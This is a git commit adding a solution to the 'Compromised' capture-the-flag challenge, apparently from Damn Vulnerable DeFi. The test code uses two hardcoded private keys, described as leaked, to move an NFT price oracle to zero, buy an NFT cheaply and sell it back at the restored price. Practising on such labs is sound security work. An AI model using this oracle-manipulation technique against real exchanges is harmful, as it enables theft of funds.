0c807918966181205c20470c4f486732cf9405e1
piken <piken_hit@hotmail.com>
2023-03-18 11:18:55 +0700

    Manipulate NFT price with leaked key

--- test/compromised/compromised.challenge.js
+++ test/compromised/compromised.challenge.js
@@ -53,6 +53,17 @@ describe('Compromised challenge', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        key1 = "0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9";
+        key2 = "0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48";
+        wallet1 = new ethers.Wallet(key1, ethers.provider);
+        wallet2 = new ethers.Wallet(key2, ethers.provider);
+        await oracle.connect(wallet1).postPrice("DVNFT",0);
+        await oracle.connect(wallet2).postPrice("DVNFT",0);
+        await exchange.connect(player).buyOne({value:1})
+        await oracle.connect(wallet1).postPrice("DVNFT",INITIAL_NFT_PRICE);
+        await oracle.connect(wallet2).postPrice("DVNFT",INITIAL_NFT_PRICE);
+        await nftToken.connect(player).approve(exchange.address, 0);
+        await exchange.connect(player).sellOne(0);
     });
 
     after(async function () {
